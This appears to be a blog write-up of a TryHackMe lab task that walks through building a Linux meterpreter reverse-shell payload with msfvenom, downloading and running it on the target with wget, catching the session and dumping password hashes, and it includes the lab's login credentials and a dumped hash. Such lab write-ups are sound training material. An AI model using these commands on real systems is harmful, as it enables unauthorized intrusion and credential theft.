---
title: "An Exercise in Metasploit"
excerpt: A short explanation of how to set a meterpreter shell to obtain password hashes of users.
date: 2025-09-19
---

This is task 6 in the room *Metasploit: Exploitation* on TryHackMe. The exercise shows nicely why the Metasploit framework is so powerful: essentially we create a payload through a single command and execute it on the target, providing us with a stable shell and root privileges.

We are given login credentials of one user, namely

```console
user: murphy
password: 1q2w3e4r
```

The goal is to get a meterpreter shell running on the target machine so we can dump the password hashes of all users. 

First, we generate a Linux Meterpreter payload on our local (attacker) machine as follows:

```console
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f elf -o meterpreter.elf
```

The individual constituents of the above command:
- `msfvenom`: A command-line utility that is part of the Metasploit Framework. Its main job is to generate and encode payloads.
- `-p`: The "payload" option.
- `linux/x64/meterpreter/reverse_tcp`: The target OS is Linux with 64-bit architecture. The actual payload, `meterpreter`, is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code. It is typically deployed using in-memory DLL injection to reside entirely in memory.
- `reverse_tcp`: The payload will provide us with a reverse shell, i.e. an outbound TCP connection back to the attacker's machine.
- `LHOST`: **L**istening **Host**. The IP address of the attacker's machine where the payload should connect back to.
- `LPORT`: **L**istening **Port**. The port on the attacker's machine that will be listening for the incoming connection. Here, `4444` is just set as an example.
- `-f elf`: Specifies the **f**ormat to be of type `elf`. The .elf format is comparable to the .exe format in Windows.
- `-o meterpreter.elf`: We simply name the **o**utput `meterpreter.elf`.

Next, we make sure that the payload is executable:

```console
chmod +x meterpreter.elf
```

In order to transfer the payload to the target, we use a Python web server, since the user `murphy` might not have sufficiently elevated privileges for our task:

```console
python3 -m http.server 9000
```

After ssh-ing onto the target as user `murphy`, we fetch the payload, save it in `/tmp` and make sure it is executable, as seen in the next command. Notice that in a real-world (malicious/unauthorized) setting, this would have to be executed by means of phishing/social-engineering etc. In this controlled environment it is straightforward.

```console
wget http://<Your_IP>:9000/meterpreter.elf -O /tmp/meterpreter.elf
chmod +x /tmp/meterpreter.elf
/tmp/meterpreter.elf
```

Back on the attacker machine, we establish a listener, similar to a standard netcat-listener:

```console
msfconsole -q                                   # Start Metasploit interface
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <Your_IP>                             # Same IP as in payload
set LPORT 4444                                  # Same port as in payload
exploit
```

Now for the moment of truth. We run the executable on the target machine with the line

```console
./meterpreter.elf
```

If all goes well, this should just keep running in the CLI of the target and we should see the following output in out local attacker CLI, where we just started the listener:

```console
[*] Meterpreter session 1 opened (<Your_IP>:4444 -> <Target_IP>:<Target_Port>)
meterpreter >
```

We now have a stable reverse shell connection. Check privileges with `getuid` or `whoami`. To dump all hashes, we can use the `post/linux/gather/hashdump` module, but we first need to background the current session. Finally, we run the exploit. Thus, we run the following commands:

```console
meterpreter > background        # Send session to background
use post/linux/gather/hashdump  # This was also the hint given by TryHackMe
set SESSION <ID>                # Replace <ID> with your session number
run
```

We find the hash of the other user (not `murphy`) to be `$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0`.






